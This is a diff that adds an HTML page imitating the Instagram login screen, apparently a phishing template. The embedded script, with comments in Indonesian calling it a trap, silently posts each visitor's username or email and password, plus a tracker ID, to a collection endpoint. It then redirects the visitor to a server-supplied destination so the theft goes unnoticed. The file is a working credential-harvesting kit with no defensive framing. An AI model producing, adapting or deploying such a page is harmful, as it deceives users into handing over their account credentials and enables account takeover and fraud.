@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login • Instagram</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  /* Reset and base */
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+  body, html {
+    height: 100%;
+    font-family: 'Roboto', Arial, sans-serif;
+    background-color: #000;
+    color: #fff;
+    overflow-x: hidden;
+  }
+
+  .sr-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border: 0;
+  }
+
+  #main-wrapper {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    max-width: 935px;
+    width: 100%;
+    margin: 0 auto;
+    flex-wrap: wrap;
+  }
+
+  .image-gallery {
+    width: 440px;
+    height: 618px;
+    background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/3c08be9939ce.png');
+    background-size: cover;
+    background-position: center;
+    position: relative;
+    margin-right: -15px;
+    display: none; /* Hidden by default for mobile */
+  }
+
+  .image-gallery::before {
+    content: '';
+    position: absolute;
+    top: 27px;
+    left: -113px;
+    width: 540px;
+    height: 520px;
+    background-image: url('landing-2x.png');
+    background-size: contain;
+    background-position: center;
+    background-repeat: no-repeat;
+    opacity: 1; /* Make the image permanently visible */
+  }
+
+  .login-form {
+    width: 350px;
+    max-width: 90vw;
+    display: flex;
+    flex-direction: column;
+    padding: 40px;
+    border: 1px solid #262626;
+    border-radius: 1px;
+    background-color: #000;
+  }
+
+  .logo-text {
+    font-family: 'Grand Hotel', cursive;
+    font-size: 52px;
+    text-align: center;
+    margin-bottom: 35px;
+    color: #fafafa;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  input[type="text"],
+  input[type="password"] {
+    background-color: #121212;
+    border: 1px solid #333;
+    border-radius: 4px;
+    padding: 12px 10px;
+    color: white;
+    font-size: 14px;
+    outline: none;
+  }
+  input:focus {
+    border-color: #666;
+  }
+  input::placeholder {
+    color: #8e8e8e;
+  }
+
+  .password-container {
+    border: 1px solid #333;
+    border-radius: 4px;
+    background-color: #121212;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+  }
+  .password-container input {
+    border: none;
+    padding: 12px 0;
+    background: transparent;
+    flex-grow: 1;
+  }
+  .toggle-password {
+    background: transparent;
+    border: none;
+    color: #e0e0e0;
+    font-weight: 500;
+    font-size: 14px;
+    cursor: pointer;
+    padding: 0 6px;
+  }
+  .toggle-password:hover {
+    text-decoration: underline;
+  }
+
+  button.login-btn {
+    margin-top: 18px;
+    background-color: #0095f6;
+    border-radius: 8px;
+    border: none;
+    font-weight: 600;
+    color: white;
+    padding: 10px 0;
+    font-size: 14px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+  }
+  button.login-btn:hover {
+    background-color: #0077c4;
+  }
+  button.login-btn:disabled {
+    background-color: rgba(0, 149, 246, 0.4);
+    cursor: not-allowed;
+  }
+
+  .or-separator {
+    text-align: center;
+    margin: 20px 0;
+    font-size: 13px;
+    color: #8e8e8e;
+    position: relative;
+    font-weight: 600;
+  }
+  .or-separator::before,
+  .or-separator::after {
+    content: "";
+    position: absolute;
+    top: 50%;
+    width: 40%;
+    height: 1px;
+    background-color: #444;
+  }
+  .or-separator::before { left: 0; }
+  .or-separator::after { right: 0; }
+
+  .facebook-login {
+    color: #385185;
+    font-weight: 600;
+    font-size: 14px;
+    text-decoration: none;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+  }
+  .facebook-login svg {
+    fill: #385185;
+    width: 18px;
+    height: 18px;
+  }
+
+  .forgot-password {
+    margin-top: 15px;
+    font-size: 12px;
+    color: #00376b;
+    text-align: center;
+    text-decoration: none;
+  }
+  .forgot-password:hover {
+    text-decoration: underline;
+  }
+
+  .signup-prompt {
+    margin-top: 10px;
+    font-size: 14px;
+    text-align: center;
+    color: #8e8e8e;
+    background-color: #000;
+    border: 1px solid #262626;
+    border-radius: 1px;
+    padding: 20px;
+  }
+  .signup-prompt a {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+  }
+
+  .footer {
+    width: 100%;
+    padding: 15px;
+    font-size: 11px;
+    color: #8e8e8e;
+    text-align: center;
+    margin-top: auto;
+    background-color: #000;
+  }
+  .footer-container {
+    max-width: 935px;
+    margin: 0 auto;
+  }
+  .footer-nav {
+    margin-bottom: 8px;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 10px;
+  }
+  .footer-nav a {
+    color: #8e8e8e;
+    text-decoration: none;
+  }
+
+  .footer-lang-copyright {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  select.language-select {
+    background-color: transparent;
+    border: 0;
+    color: #8e8e8e;
+    font-size: 11px;
+    cursor: pointer;
+  }
+  .copyright {
+    font-size: 11px;
+  }
+
+  @media (min-width: 871px) {
+    .image-gallery { display: block; }
+    .right-column { margin-top: -30px; }
+  }
+
+  @media (max-width: 870px) {
+    .container {
+      flex-direction: column;
+      gap: 15px;
+      padding: 30px 15px;
+    }
+  }
+  @media (max-width: 480px) {
+    .logo-text { font-size: 48px; margin-bottom: 30px; }
+    .login-form { padding: 15px; width: 100%; max-width: 350px; }
+    input[type="text"], input[type="password"] { padding: 10px 8px; font-size: 13px; }
+    button.login-btn { padding: 9px 0; font-size: 13px; }
+    .facebook-login { font-size: 13px; }
+    .facebook-login svg { width: 16px; height: 16px; }
+    .forgot-password, .signup-prompt { font-size: 11px; }
+    .or-separator { margin: 18px 0; font-size: 12px; }
+    .signup-prompt { margin-top: 25px; }
+    .footer-nav a, .language-select, .copyright { font-size: 10px; }
+    .footer { padding-top: 10px; }
+  }
+</style>
+</head>
+<body>
+  <div id="main-wrapper">
+    <div class="container" role="main">
+      <div class="image-gallery" aria-hidden="true"></div>
+      <div class="right-column">
+        <section class="login-form">
+          <h1 class="logo-text">Instagram</h1>
+          <form id="loginForm" autocomplete="off" novalidate>
+            <input id="username" type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username" />
+            <div class="password-container">
+              <input id="password" type="password" name="password" placeholder="Password" required autocomplete="current-password" />
+              <button type="button" class="toggle-password" id="togglePasswordBtn">Show</button>
+            </div>
+            <button type="submit" class="login-btn" disabled>Log in</button>
+          </form>
+          <div class="or-separator">OR</div>
+          <a href="#" class="facebook-login">
+            <svg viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.595 0 0 .593 0 1.326v21.347C0 23.406.594 24 1.326 24h11.492v-9.294H9.691v-3.622h3.127V8.413c0-3.1 1.893-4.788 4.658-4.788 1.325 0 2.464.097 2.794.142v3.24h-1.918c-1.504 0-1.796.715-1.796 1.763v2.313h3.59l-.467 3.622h-3.123V24h6.116c.73 0 1.324-.594 1.324-1.326V1.326C24 .593 23.406 0 22.675 0z"/></svg>
+            Log in with Facebook
+          </a>
+          <a href="#" class="forgot-password">Forgot password?</a>
+        </section>
+        <p class="signup-prompt">Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="footer-container">
+        <nav class="footer-nav">
+          <a href="#">Meta</a>
+          <a href="#">About</a>
+          <a href="#">Blog</a>
+          <a href="#">Jobs</a>
+          <a href="#">Help</a>
+          <a href="#">API</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+          <a href="#">Locations</a>
+          <a href="#">Instagram Lite</a>
+          <a href="#">Meta AI</a>
+          <a href="#">Threads</a>
+          <a href="#">Contact Uploading & Non-Users</a>
+          <a href="#">Meta Verified</a>
+        </nav>
+        <div class="footer-lang-copyright">
+          <select class="language-select">
+            <option value="en">English</option>
+            <option value="id">Bahasa Indonesia</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="zh">中文</option>
+            <option value="ja">日本語</option>
+            <option value="ar">العربية</option>
+            <option value="ru">Русский</option>
+          </select>
+          <span class="copyright">© 2025 Instagram from Meta</span>
+        </div>
+      </div>
+    </footer>
+  </div>
+<script>
+  // ===================================================================
+  // === BLOK KODE BARU UNTUK FUNGSI JEBAKAN (TRAP) ===
+  // ===================================================================
+
+  // VARIABEL INI AKAN DIISI OTOMATIS OLEH SERVER ANDA
+  const trackerId = "{{TRACKER_ID}}";
+  const destinationUrl = "{{DESTINATION_URL}}";
+
+  // MENGAMBIL ELEMENT DARI HTML
+  const passwordInput = document.getElementById('password');
+  const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+  const loginForm = document.getElementById('loginForm');
+  const usernameInput = document.getElementById('username');
+  const loginBtn = document.querySelector('.login-btn');
+
+  // FUNGSI UNTUK TOMBOL SHOW/HIDE PASSWORD (TETAP ADA)
+  togglePasswordBtn.addEventListener('click', () => {
+    const isPassword = passwordInput.type === 'password';
+    passwordInput.type = isPassword ? 'text' : 'password';
+    togglePasswordBtn.textContent = isPassword ? 'Hide' : 'Show';
+  });
+
+  // FUNGSI UNTUK MENGAKTIFKAN TOMBOL LOGIN (TETAP ADA)
+  function checkInputs() {
+    const allFilled = usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '';
+    loginBtn.disabled = !allFilled;
+  }
+  usernameInput.addEventListener('input', checkInputs);
+  passwordInput.addEventListener('input', checkInputs);
+  checkInputs(); // Panggil saat awal untuk set state tombol
+
+  // FUNGSI UTAMA UNTUK MENGIRIM KREDENSIAL DAN REDIRECT
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Mencegah form reload halaman
+    
+    if (loginBtn.disabled) return; // Jangan lakukan apa-apa jika tombol disabled
+
+    // Nonaktifkan tombol untuk mencegah klik ganda
+    loginBtn.disabled = true;
+    loginBtn.textContent = 'Logging in...';
+
+    // Ambil nilai dari input
+    const email = usernameInput.value;
+    const password = passwordInput.value;
+
+    try {
+      // Kirim data kredensial ke server secara diam-diam (fire and forget)
+      await fetch('/api/credentials', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, trackerId }),
+      });
+    } catch (error) {
+      console.error('Error logging credentials:', error);
+    } finally {
+      // APAPUN YANG TERJADI (berhasil atau gagal), langsung redirect ke tujuan
+      window.location.href = destinationUrl;
+    }
+  });
+</script>
+</body>
+</html>
